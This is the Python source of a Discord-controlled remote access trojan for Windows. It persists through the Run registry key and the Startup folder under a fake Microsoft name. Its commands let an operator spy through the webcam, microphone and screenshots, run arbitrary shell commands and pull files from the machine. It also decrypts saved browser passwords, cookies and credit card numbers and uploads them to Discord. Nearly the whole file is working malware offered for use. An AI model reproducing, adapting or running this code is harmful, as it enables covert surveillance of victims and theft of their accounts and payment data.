import discord
from discord.ext import commands, tasks
import requests
import os
from discord import Permissions
import subprocess
import random
import cv2
import shutil
import sys
import sounddevice as sd
import wave
from PIL import ImageGrab
import numpy as np
from io import BytesIO
from time import time
import ctypes
from discord.ext.commands import Context
import inspect
from gtts import gTTS
import base64
import json
import os
import shutil
import sqlite3
from pathlib import Path
from zipfile import ZipFile
import platform
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import json



intents = discord.Intents.all()
intents.all()
intents.guilds = True
intents.messages = True
permissions = discord.Permissions()
permissions.manage_channels = True
permissions.manage_messages = True
intents.members = True
permissions = Permissions()
permissions.administrator = True
client = discord.Client(intents=intents)

file_path = os.path.abspath(sys.argv[0])
register = ["reg", "add", r"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\Windows\\CurrentVersion\\Run", "/v", "MicrosoftServiceCollecter", "/t", "REG_SZ", "/d", file_path]
subprocess.call(['echo', 'y', '|'] + register, shell=True)

temp = os.getenv("appdata")
temp_path = os.path.join(temp, ''.join(random.choices(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=50)))
os.mkdir(temp_path)


bot = commands.Bot(command_prefix='!', intents=intents)


computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(
    errors='ignore').strip().splitlines()[2].strip()
cpu = subprocess.run(["wmic", "cpu", "get", "Name"],
                     capture_output=True, text=True).stdout.strip().split('\n')[2]
gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True,
                     shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
                  shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
username = os.getenv("UserName")
hostname = os.getenv("COMPUTERNAME")
hwid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                               stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
ip = requests.get('https://api.ipify.org').text
mac = subprocess.check_output("getmac", shell=True, stdin=subprocess.PIPE,
                              stderr=subprocess.PIPE).decode('utf-8').split("\n")[1].strip()
video_capture = cv2.VideoCapture(0)
frame_width = int(video_capture.get(3))
frame_height = int(video_capture.get(4))

out = cv2.VideoWriter(temp_path + '\\webcam.avi', cv2.VideoWriter_fourcc('M',
                      'J', 'P', 'G'), 30, (frame_width, frame_height))

CHANNEL_ID = None

script_path = os.path.abspath(sys.argv[0])

if sys.platform.startswith('win'):
    startup_path = os.path.join(os.getenv(
        'APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    if not os.path.exists(os.path.join(startup_path, os.path.basename(script_path))):
        shutil.copy(script_path, startup_path)
else:
    pass

new_path = (temp +"\\Microsoft_Session")

if os.path.exists(new_path) and os.path.isdir(new_path):
    with open(new_path+"\\session.txt", "r") as userchannel:
        channel_name = userchannel.read()
else:
    with open(f"{temp_path}\\session{random.randint(0,9999999)}.txt", "w+") as userchannel:
        userchannel.write(str(random.randint(0,99999999)))
        userchannel.seek(0)
        channel_name = userchannel.read()
    

def control_channel(ctx):
    allowed_channel = channel_name
    if ctx.channel.name.lower() != allowed_channel:
        return False
    else:
        return True
    
@bot.event
async def on_ready():

    guild = bot.guilds[0] if bot.guilds else None

    if guild:
        all_channels = [channel.name.lower() for channel in guild.channels]

        if channel_name not in all_channels:
            new_channel = await guild.create_text_channel(channel_name)

        channel = discord.utils.get(guild.channels, name=channel_name)

        if channel:
            await channel.send("""```@everyone !helpme for commands.```""")


@bot.command(name=("ss"))
async def ss(ctx, numberofphoto: int):
    if control_channel(ctx) == True:
        number = 0
        try:
            while not number == numberofphoto:
                number += 1
                image = ImageGrab.grab(
                    bbox=None,
                    all_screens=True,
                    include_layered_windows=False,
                    xdisplay=None
                )

                image.save(temp_path + "\\desktopshot.png")
                ss = temp_path + "\\desktopshot.png"

                if ctx.message.content.startswith('!ss'):
                    channel = ctx.channel
                    file = discord.File(ss, filename='ss.jpg')
                    await ctx.channel.send(file=file)

        except Exception as e:
            await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="ws")
async def webcamshot(ctx, numberofphoto: int):
    if control_channel(ctx) == True:
        try:
            number = 0
            wbshot = cv2.VideoCapture(0)
            while not number == numberofphoto:
                number += 1
                return_value, image = wbshot.read()
                cv2.imwrite(temp_path + "\\webcamshot.png", image)
                webcamshotpng = temp_path + "\\webcamshot.png"
                wbshotpng = discord.File(webcamshotpng, filename="webcamshot.png")
                await ctx.channel.send(file=wbshotpng)

            wbshot.release()
            cv2.destroyAllWindows()
        except:
            await ctx.send("```No cam found...```")


@tasks.loop(seconds=1/30)  # For 30FPS.(Recommened.)
async def send_camera_feed():
    ret, frame = video_capture.read()

    if ret:
        _, image = cv2.imencode('.png', frame)
        image_array = np.array(image).tobytes()

        # Create Discord File using with BytesIO.
        file = discord.File(BytesIO(image_array), filename='image.png')

        channel = bot.get_channel(CHANNEL_ID)
        await channel.send(file=file)


@bot.command(name="wstream")
async def stream(ctx):
    if control_channel(ctx) == True:
        channel_names = channel_name + "-stream"
        try:
            guild = bot.guilds[0] if bot.guilds else None
            channel_name_lower = channel_names.lower() + "stream"

            if guild:
                all_channels = [channel.name.lower() for channel in guild.channels]

                if channel_name_lower not in all_channels:
                    new_channel = await guild.create_text_channel(channel_name_lower)

                channel = discord.utils.get(
                    guild.channels, name=channel_name_lower)

                if channel:
                    global CHANNEL_ID
                    CHANNEL_ID = channel.id
                    send_camera_feed.start()
                    await channel.send('```Stream Started!```@everyone')

        except Exception as e:
            await ctx.send(f"```Error :\n {e} ``` ")


@bot.command(name="stopstream")
async def stop(ctx):
    if control_channel(ctx) == True:
        channel_names = channel_name + "-stream"
        guild = bot.guilds[0] if bot.guilds else None
        channel_name_lower = channel_names.lower() + "stream"
        channel = discord.utils.get(guild.channels, name=channel_name_lower)
        global CHANNEL_ID
        CHANNEL_ID = channel.id
        send_camera_feed.stop()
        cv2.destroyAllWindows()
        await channel.send('```Stopped!```')


@bot.command(name="video")
async def recordvideo(ctx, seconds: int):
    if control_channel(ctx) == True:

        start_time = time()
        try:
            # OpenCV VideoCapture
            video_capture = cv2.VideoCapture(0)

            # Define the codec and create a VideoWriter object
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            videofile_path = temp_path + '\\webcam.avi'
            out = cv2.VideoWriter(videofile_path, fourcc, 20.0, (640, 480))

            while True:
                ret, frame = video_capture.read()

                # Record Video
                out.write(frame)

                elapsed_time = time() - start_time
                if elapsed_time >= seconds:
                    break

            video_capture.release()
            out.release()
            cv2.destroyAllWindows()

            await ctx.channel.send("```Here It Is!```\n", file=discord.File(videofile_path, filename="webcam.avi"))

        except Exception as e:
            await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="recordvoice")
async def recordvoice(ctx, seconds: int):
    if control_channel(ctx) == True:

        def save(voicefile0, examplenumber=44100):
            register_second = seconds
            register_examplenumber = examplenumber
            # Recording Voice
            voice = sd.rec(int(register_examplenumber * register_second),
                        samplerate=examplenumber, channels=2, dtype='int16')
            sd.wait()

            # Write the Voice File
            with wave.open(voicefile0, 'wb') as wf:
                wf.setnchannels(2)
                # 2-byte (for int16 type)
                wf.setsampwidth(2)
                wf.setframerate(examplenumber)
                wf.writeframes(voice.tobytes())

        voicefile0 = temp_path + "\\voice.wav"
        save(voicefile0)
        voicefile = discord.File(voicefile0, filename="voice.wav")
        await ctx.channel.send('```Here It Is!```\n', file=voicefile)


@bot.command(name="ps")
async def command(ctx, *args):
    if control_channel(ctx) == True:
        command_string = " ".join(args)
        try:
            result = subprocess.run(command_string, shell=True,
                                    capture_output=True, text=True)
            if len(result.stdout) > 2000:
                chunk_size = 1000
                chunks = [result.stdout[i:i+chunk_size]
                        for i in range(0, len(result.stdout), chunk_size)]

                for i, chunk in enumerate(chunks, start=1):
                    await ctx.channel.send(f"```Command Output (Part {i}:\n\n{chunk}\n```")
            else:
                await ctx.channel.send(f"```{result.stdout}```")
                await ctx.channel.send(f"```{result.stderr}```")

        except Exception as e:
            await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="cd")
async def listfile(ctx, *args):
    if control_channel(ctx) == True:
        try:
            command_string = " ".join(args)
            os.chdir(command_string)
            result = subprocess.run(
                "dir", shell=True, capture_output=True, text=True)
            chunk_size = 1000
            chunks = [result.stdout[i:i+chunk_size]
                    for i in range(0, len(result.stdout), chunk_size)]

            for i, chunk in enumerate(chunks, start=1):
                await ctx.channel.send(f"Command Output (Part {i}):\n```\n{chunk}\n```")
        except Exception as e:
            await ctx.channel.send(f"{e}")

@bot.command(name="kill")
async def tasklist(ctx, *args):
    if control_channel(ctx) == True:
        command_string = " ".join(args)

        result = subprocess.run("taskkill /F /IM " + command_string, shell=True,
                                capture_output=True, text=True)
        chunk_size = 1000
        chunks = [result.stdout[i:i+chunk_size]
                for i in range(0, len(result.stdout), chunk_size)]

        for i, chunk in enumerate(chunks, start=1):
            await ctx.channel.send(f"```   Part {i}:```  \n```\n{chunk}\n```")


@bot.command(name="get")
async def getfile(ctx, *args):
    if control_channel(ctx) == True:
        command_string = " ".join(args)

        file = discord.File(command_string)
        try:
            await ctx.channel.send("Here Is Your File!", file=file)
        except Exception as e:
            await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="setlang")
async def changelang(ctx, lang):
    if control_channel(ctx) == True:
        try:
            global language
            language = lang
            await ctx.channel.send(f"```Lang Changed: {language}```")
        except Exception as e:
            await ctx.channel.send(f"```Error: {e}```")


@bot.command(name="say")
async def say(ctx, *args):
    if control_channel(ctx) == True:
        global language
        text = " ".join(args)
        tts = gTTS(text=text, lang=language, slow=False)
        tts.save(temp_path + "/say.mp3")
        sound = temp_path + "/say.mp3"
        try:
            subprocess.Popen(["start", sound], shell=True)
            await ctx.channel.send("```Its Done Sir!```")
        except Exception as e:
            await ctx.channel.send(f"```Error: {e}```")


@bot.command(name="msg")
async def msg(ctx, *args):
    if control_channel(ctx) == True:

        msg = " ".join(args)
        try:
            MB_YESNO = 0x04
            MB_HELP = 0x4000
            ICON_STOP = 0x10
            ctypes.windll.user32.MessageBoxW(
                0, msg, "Error", MB_HELP | MB_YESNO | ICON_STOP)

        except Exception as e:
            await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="amiadmin")
async def amiadmin(ctx):
    if control_channel(ctx) == True:
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                await ctx.channel.send("```[*] Congrats you're admin!```")
            elif is_admin == False:
                await ctx.channel.send("```[!] Sorry, you're not admin.```")

        except Exception as e:
            await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="hide")
async def hide(ctx):
    if control_channel(ctx) == True:
        try:
            thefile = inspect.getframeinfo(inspect.currentframe()).filename
            os.system(f"attrib +h {thefile}")
            await ctx.channel.send("```The File Hided!```")

        except Exception as e:
            await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="shutdown")
async def shutdown(ctx):
    if control_channel(ctx) == True:
        try:
            await ctx.channel.send("```Okay Sir...```")
            os.system("shutdown /s /t 0")

        except Exception as e:
            await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="restart")
async def restart(ctx):
    if control_channel(ctx) == True:
        try:
            await ctx.channel.send("```Okay Sir...```")
            os.system("shutdown /r /t 0")

        except Exception as e:
            await ctx.channel.send(f"```Error :\n {e} ``` ")


@bot.command(name="voice")
async def voice(ctx, *args):
    if control_channel(ctx) == True:
        voicefile = " ".join(args)

        try:
            if ctx.message.attachments:
                attachment = ctx.message.attachments[0]
                url = attachment.url
                response = requests.get(url)

                temp_filename = "remotevoicefile.mp3"
                with open(temp_filename, "wb") as f:
                    f.write(response.content)

                subprocess.Popen(["start", temp_filename], shell=True)
        except Exception as e:
            await ctx.channel.send(f"```Error:\n{e}```")


@bot.command(name="wallpaper")
async def wallpaper(ctx, *args):
    if control_channel(ctx) == True:
        try:
            if ctx.message.attachments:
                attachment = ctx.message.attachments[0]
                url = attachment.url
                response = requests.get(url)

                temp_filename = "remotepngfasdaile.png"
                with open(temp_filename, "wb") as f:
                    f.write(response.content)

                # Set the wallpaper
                new_wallpaperpath = os.path.abspath(temp_filename)
                command = f'reg add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "{new_wallpaperpath}" /f'
                os.system(command)

                # Update the wallpaper
                os.system('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters')

                await ctx.send("```Wallpaper updated successfully!```")
            else:
                await ctx.send("```Please provide an image attachment.```")
        except Exception as e:
            await ctx.send(f"```Error:\n{e}```")


@bot.command(name="website")
async def website(ctx, *args):
    if control_channel(ctx) == True:
        try:
            url = " ".join(args)
            subprocess.call("start " + url, shell=True)
            await ctx.channel.send("```Command successfuly executed!```")
        except Exception as e:
            await ctx.channel.send(f"```Error:\n{e}```")


@bot.command(name="upload")
async def upload(ctx, *args):
    if control_channel(ctx) == True:
        try:
            file = " ".join(args)
            if ctx.message.attachments:
                attachment = ctx.message.attachments[0]
                url = attachment.url
                response = requests.get(url)

                temp_filename = "changethename.exe"
                with open(temp_filename, "wb") as f:
                    f.write(response.content)

                await ctx.channel.send(f"```File Uploaded to {os.getcwd()}\\{temp_filename} !```")
        except Exception as e:
            await ctx.channel.send(f"```Error:\n{e}```")


@bot.command(name="critproc")
async def critproc(ctx):
 if control_channel(ctx) == True:
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(
            20, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
        await ctx.channel.send("```Command Exucuted!```")
    except Exception as e:
        await ctx.channel.send("```Command can not be Exacutable...```")


def tree(path: Path, prefix: str = '', midfix_folder: str = '📂 - ', midfix_file: str = '📄 - '):
    pipes = {
        'space':  '    ',
        'branch': '│   ',
        'tee':    '├── ',
        'last':   '└── ',
    }

    if prefix == '':
        yield midfix_folder + path.name

    contents = list(path.iterdir())
    pointers = [pipes['tee']] * (len(contents) - 1) + [pipes['last']]
    for pointer, path in zip(pointers, contents):
        if path.is_dir():
            yield f"{prefix}{pointer}{midfix_folder}{path.name} ({len(list(path.glob('**/*')))} files, {sum(f.stat().st_size for f in path.glob('**/*') if f.is_file()) / 1024:.2f} kb)"
            extension = pipes['branch'] if pointer == pipes['tee'] else pipes['space']
            yield from tree(path, prefix=prefix+extension)
        else:
            yield f"{prefix}{pointer}{midfix_file}{path.name} ({path.stat().st_size / 1024:.2f} kb)"

def g35(INFO):
    response = requests.get("https://ipinfo.io/json")
    if response.status_code == 200:
        data = response.json()
        INFO.append(f"IP: {data['ip']}\nTimezone: {data['timezone']}\nCity: {data['city']}\nRegion: {data['region']}\nCountry: {data['country']}\nLoc: {data['loc']}\nOrg: {data['org']}\nPostal: {data['postal']}")

def s4st7m(SYSTEM_INFO):
    SYSTEM_INFO.append(f"Platform: {platform.platform()}\nVersion: {platform.version()}\nProcessor: {platform.processor()}\nMachine: {platform.machine()}\nNode: {platform.node()}")

def st4art7u0():
    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    if hasattr(sys, 'frozen'):
        source_path = sys.executable
    else:
        source_path = sys.argv[0]

    target_path = os.path.join(startup_path, os.path.basename(source_path))
    if os.path.exists(target_path):
        os.remove(target_path)

    shutil.copy2(source_path, startup_path)

def get_master_key(path: str) -> str:
    if not os.path.exists(path):
        return None

    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
        local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    return CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    return decrypted_pass[:-16].decode()

def g34_l0g1n_d474(path: str, profile: str, master_key: bytes, LOGINS):
    login_db = os.path.join(path, profile, 'Login Data')
    if not os.path.exists(login_db):
        return

    shutil.copy(login_db, 'login_db')
    conn = sqlite3.connect('login_db')
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2]:
            continue

        password = decrypt_password(row[2], master_key)
        LOGINS.append(f'{row[0]}\t{row[1]}\t{password}')

    conn.close()
    os.remove('login_db')

def g47_c00k13s(path: str, profile: str, master_key: bytes, COOKIES):
    cookie_db = os.path.join(path, profile, 'Network', 'Cookies')
    if not os.path.exists(cookie_db):
        return

    try:
        shutil.copy(cookie_db, 'cookie_db')
        conn = sqlite3.connect('cookie_db')
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            cookie = decrypt_password(row[3], master_key)
            COOKIES.append(f'{row[0]}\t{"FALSE" if row[4] == 0 else "TRUE"}\t{row[2]}\t{"FALSE" if row[0].startswith(".") else "TRUE"}\t{row[4]}\t{row[1]}\t{cookie}')

        conn.close()
        os.remove('cookie_db')
    except PermissionError:
        print(f"Permission denied: {cookie_db}")
    except FileNotFoundError:
        print("cookie_db not found")

def g37_w36_h1570r7(path: str, profile: str, WEB_HISTORY):
    web_history_db = os.path.join(path, profile, 'History')
    if not os.path.exists(web_history_db):
        return

    shutil.copy(web_history_db, 'web_history_db')
    conn = sqlite3.connect('web_history_db')
    cursor = conn.cursor()
    cursor.execute('SELECT url, title, last_visit_time FROM urls')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2]:
            continue

        WEB_HISTORY.append(f'{row[0]}\t{row[1]}\t{row[2]}')

    conn.close()
    os.remove('web_history_db')

def g35_40wnl044s(path: str, profile: str, DOWNLOADS):
    downloads_db = os.path.join(path, profile, 'History')
    if not os.path.exists(downloads_db):
        return

    shutil.copy(downloads_db, 'downloads_db')
    conn = sqlite3.connect('downloads_db')
    cursor = conn.cursor()
    cursor.execute('SELECT tab_url, target_path FROM downloads')
    for row in cursor.fetchall():
        if not row[0] or not row[1]:
            continue

        DOWNLOADS.append(f'{row[0]}\t{row[1]}')

    conn.close()
    os.remove('downloads_db')

def g34_3r341t_3434s(path: str, profile: str, master_key: bytes, CARDS):
    cards_db = os.path.join(path, profile, 'Web Data')
    if not os.path.exists(cards_db):
        return

    shutil.copy(cards_db, 'cards_db')
    conn = sqlite3.connect('cards_db')
    cursor = conn.cursor()
    cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        card_number = decrypt_password(row[3], master_key)
        CARDS.append(f'{row[0]}\t{row[1]}\t{row[2]}\t{card_number}\t{row[4]}')

    conn.close()
    os.remove('cards_db')

def write_files(LOGINS, COOKIES, WEB_HISTORY, DOWNLOADS, INFO, SYSTEM_INFO, CARDS):
    os.makedirs("dinner", exist_ok=True)
    if LOGINS:
        with open("dinner/logins.txt", "w", encoding="utf-8") as f:
            f.write('\n'.join(str(x) for x in LOGINS))

    if COOKIES:
        with open("dinner/cookies.txt", "w", encoding="utf-8") as f:
            f.write('\n'.join(str(x) for x in COOKIES))

    if WEB_HISTORY:
        with open("dinner/web_history.txt", "w", encoding="utf-8") as f:
            f.write('\n'.join(str(x) for x in WEB_HISTORY))

    if DOWNLOADS:
        with open("dinner/downloads.txt", "w", encoding="utf-8") as f:
            f.write('\n'.join(str(x) for x in DOWNLOADS))

    if INFO:
        with open("dinner/info.txt", "w", encoding="utf-8") as f:
            f.write('\n'.join(str(x) for x in INFO))

    if SYSTEM_INFO:
        with open("dinner/system_info.txt", "w", encoding="utf-8") as f:
            f.write('\n'.join(str(x) for x in SYSTEM_INFO))

    if CARDS:
        with open("dinner/cards.txt", "w", encoding="utf-8") as f:
            f.write('\n'.join(str(x) for x in CARDS))

    with ZipFile("dinner.zip", "w") as zipf:
        for file in os.listdir("dinner"):
            zipf.write(f"dinner/{file}", file)

async def send_dinner(ctx):
    dinner_zip_path = Path("dinner.zip")
    with ZipFile(dinner_zip_path, 'w') as zipf:
        for file_path in Path("dinner").rglob('*'):
            zipf.write(file_path, file_path.relative_to("dinner"))

    embed = discord.Embed(
        title="Dinner",
        description="```" + '\n'.join(tree(Path("dinner"))) + "```"
    )

    file = discord.File(dinner_zip_path, filename="dinner.zip")
    await ctx.send(embed=embed, file=file)

def clean():
    shutil.rmtree("dinner")
    os.remove("dinner.zip")

@bot.command(name="passwrd")
async def passwrd(ctx):
    if control_channel(ctx):
        LOGINS = []
        COOKIES = []
        WEB_HISTORY = []
        DOWNLOADS = []
        CARDS = []
        INFO = []
        SYSTEM_INFO = []

        g35(INFO)
        s4st7m(SYSTEM_INFO)
        st4art7u0()

        appdata = os.getenv('LOCALAPPDATA')
        browsers = {
            'amigo': appdata + '\\Amigo\\User Data',
            'torch': appdata + '\\Torch\\User Data',
            'kometa': appdata + '\\Kometa\\User Data',
            'orbitum': appdata + '\\Orbitum\\User Data',
            'cent-browser': appdata + '\\CentBrowser\\User Data',
            '7star': appdata + '\\7Star\\7Star\\User Data',
            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': appdata + '\\Iridium\\User Data',
        }
        profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']

        for _, path in browsers.items():
            if not os.path.exists(path):
                continue

            master_key = get_master_key(os.path.join(path, 'Local State'))
            if not master_key:
                continue

            for profile in profiles:
                if not os.path.exists(os.path.join(path, profile)):
                    continue

                g34_l0g1n_d474(path, profile, master_key, LOGINS)
                g47_c00k13s(path, profile, master_key, COOKIES)
                g37_w36_h1570r7(path, profile, WEB_HISTORY)
                g35_40wnl044s(path, profile, DOWNLOADS)
                g34_3r341t_3434s(path, profile, master_key, CARDS)

        write_files(LOGINS, COOKIES, WEB_HISTORY, DOWNLOADS, INFO, SYSTEM_INFO, CARDS)
        await send_dinner(ctx)
        clean()
        
@bot.command(name="session")
async def session(ctx, *args):
    if control_channel(ctx) == True:
        try:
            guild = bot.guilds[0] if bot.guilds else None
            userinput = str("".join(args))
            new_temp_path = (temp + "\\Microsoft_Session")

            if os.path.exists(new_temp_path) and os.path.isdir(new_temp_path):
                with open(f"{new_temp_path}\\session.txt", "w+") as f:
                    f.write(f"{str(userinput)}")
                    f.seek(0)
                    channel = f.read()
                new_channel = await guild.create_text_channel(channel)
                await ctx.send("```Session Created. Need a restart to use.```")
            else:
                os.mkdir(new_temp_path)
                with open(f"{new_temp_path}\\session.txt", "w+") as f:
                    f.write(f"{str(userinput)}")
                    f.seek(0)
                    channel = f.read()
                new_channel = await guild.create_text_channel(channel)
                await ctx.send("```Session Created. Need a restart to use.```")

        except Exception as e:
            await ctx.channel.send(f"```Error:\n{e}```")


@bot.command(name="helpme")
async def helpmsg(ctx):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    await ctx.channel.send(r"""```
!helpme : Shows Commands. 
!ss (number) : Take Screenshot.
!getinfo : Get Them Info.
!recordvoice (second) : Record a Voice File.
!ws (number) : Webcamshot.
!wstream :Real Time Photos.
!stopstream :Stop Real Time Photos.
!video (second) : Record Video.
!ps (command) : Sends Commands to Target.
!cd (folder name) : Change Directory With That.
!kill (procces) : Kill a Task.
!hide : Hide App.
!setlang (lang code) : Set Language Before Using !say. 
!say (custom input) : Say Something Nice to Target.
!amiadmin : Checks If You Are Admin or Not.
!get (file or file path) : Get the File In the Target.
!voice (file) : Upload a Voice File Into Target and Run It.
!shutdown : Closes The PC.
!restart : Restart The Pc.
!msg (custom input) : Send a MessageBox.
!wallpaper (picture) : Change the Wallpaper.(only png.)
!critproc : It Make The File has a Critical Process.
!upload (file) : Upload a File.
!website (website url) : Go to the Website.
!session (session name) : Create a Session. (Need a restart to use.)
!passwrd : Get Passwords & Accounts Cookies & Logins & Cards & Web History & Downloads & Info.
DO NOT FORGET TO GIVE SECONDS OR NUMBERS!
    example usage : !ws 10 it will take 10 webcamshot for a second.
    example usage : !recordvoice 10 it will record the voice for 10 seconds.
    example usage : !video 10 it will record the webcam for 10 seconds.
    example usage : !ss 4 it will take 4 ss for a second.
    example usage : !voice (voice file.)
    example usage : !msg (custom sentences.)
    example usage : !say (custom sentences.)
    example usage : !setlang (lang code.)
    example usage : !get (the file path.)
    example usage : !wallpaper (any picture file.)
    example usage : !kill (procces.)
    example usage : !cd (folder.)
    example usage : !ps (command.)
    example usage : !website (https://google.com)
    example usage : !upload (file.)
!cmd : You Can See the Best CMD Commands.(Also You Can Find On Net.) ```                                                        
""")


@bot.command(name="cmd")
async def cmd(ctx):
    allowed_channel = channel_name

    if ctx.channel.name.lower() != allowed_channel:

        return
    await ctx.channel.send(r"""```

Usage: dir
Example: Lists files and directories in the current directory.
cls (Clear Screen):

Usage: cls
Example: Clears the Command Prompt screen.
ipconfig (IP Configuration):

Usage: ipconfig
Example: Displays information about network interfaces and IP configuration.
ping (Ping a Server):

Usage: ping [hostname or IP address]
Example: ping www.google.com
netstat (Network Statistics):

Usage: netstat -a
Example: Displays active network connections.
tasklist (List Running Processes):

Usage: tasklist
Example: Lists all running processes on the system.
taskkill (Terminate a Process):

Usage: taskkill /F /IM [process name]
Example: taskkill /F /IM notepad.exe
systeminfo (System Information):

Usage: systeminfo
Example: Displays detailed information about the computer's configuration.
sfc (System File Checker):

Usage: sfc /scannow
Example: Scans and repairs system files.
chkdsk (Check Disk):

Usage: chkdsk /f
Example: Checks and repairs disk errors.

gpupdate (Group Policy Update):
Usage: gpupdate /force
Example: Forces an immediate update of Group Policy.

shutdown (Shutdown or Restart):
Usage: shutdown /s /t 0 (Shutdown)
Usage: shutdown /r /t 0 (Restart)
                   
mklink (Create Symbolic Links):
Usage: mklink /d [link] [target]
Example: mklink /d C:\LinkToFolder C:\TargetFolder
copy (Copy Files):

Usage: copy [source] [destination]
Example: copy C:\File.txt D:\Backup
xcopy (Extended Copy):

Usage: xcopy [source] [destination] /E /H /C /K /Y
Example: xcopy C:\SourceFolder D:\DestinationFolder /E /H /C /K /Y
attrib (File Attribute Manipulation):

Usage: attrib +h +s [file or folder]
Example: Hides and sets a file or folder as system.

md (Make Directory):
Usage: md [directory name]
Example: md NewFolder
                   ```""")
